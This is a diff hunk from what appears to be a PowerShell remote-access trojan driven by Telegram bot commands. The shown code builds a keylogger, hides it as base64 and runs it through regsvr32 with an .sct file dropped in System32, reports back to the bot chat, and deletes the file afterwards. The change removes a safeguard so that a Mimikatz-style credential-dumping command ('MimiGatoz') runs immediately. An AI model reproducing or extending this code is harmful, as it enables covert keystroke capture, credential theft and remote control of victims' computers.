@@ -293,7 +293,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`n Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae $comando ; $code = code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code ; $plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 10 ; Remove-Item C:\Windows\System32\log.sct}
- if ($comando -like "/MimiGatoz"  -and $first_connect -gt 5) {mimigatoz}
+ if ($comando -like "/MimiGatoz") {mimigatoz}
 # if ($comando -eq "Mimikittenz") {$texto = "La funcion mimikitenz se ejecuta: `n /Mimikittenz On`n /Mimikittenz Off"}
  if ($comando -eq "Mimikittenz") {$texto = "Proximamente.."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 }
